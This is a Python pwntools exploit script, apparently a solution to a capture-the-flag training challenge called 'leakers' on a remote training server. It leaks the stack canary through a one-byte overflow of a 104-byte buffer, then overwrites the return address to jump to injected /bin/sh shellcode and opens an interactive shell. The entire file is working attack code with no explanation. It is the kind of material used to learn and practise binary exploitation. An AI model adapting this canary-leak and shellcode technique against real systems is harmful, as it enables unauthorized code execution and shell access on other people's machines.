import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

r = pwn.remote('training.jinblack.it', 2010)

# r = pwn.process('./leakers')

# pwn.gdb.attach(r, """c

# """)

input('wait')

shell_code = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

name = shell_code

r.send(name + b'\x00')

pwn.sleep(0.1)

buffer_len = 104

filler_until_canary = b'A' * (buffer_len + 1)

r.send(filler_until_canary)

r.recvuntil(name + b'> ')

r.recv(len(filler_until_canary))

canary = b'\x00' + r.recv(7)

print(canary)

shellcode_buffer_addr = 0x00404080

r.send(b'A' * buffer_len + canary + b'\x90' * 8 + pwn.p64(shellcode_buffer_addr))

r.interactive()